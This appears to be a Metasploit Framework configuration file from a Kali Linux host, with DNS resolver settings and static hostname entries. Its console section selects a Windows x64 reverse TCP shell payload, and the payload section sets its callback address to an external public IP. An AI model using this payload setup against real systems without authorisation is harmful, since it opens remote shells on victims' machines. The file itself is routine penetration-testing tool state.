[framework/core]

[framework/dns]
configuration_version=1.0

[framework/dns/rules]
#0=*;static,8.8.8.8,8.8.4.4;false

[framework/dns/static_hostnames]
#0=localhost;127.0.0.1,::1
#1=kali;127.0.0.1
#2=ip6-localhost;::1
#3=ip6-loopback;::1
#4=ip6-localnet;fe00::
#5=ip6-mcastprefix;ff00::
#6=ip6-allnodes;ff02::1
#7=ip6-allrouters;ff02::2

[framework/features]

[framework/ui/console]
ActiveModule=payload/windows/x64/shell/reverse_tcp

[windows/x64/shell/reverse_tcp]
LHOST=106.216.111.106

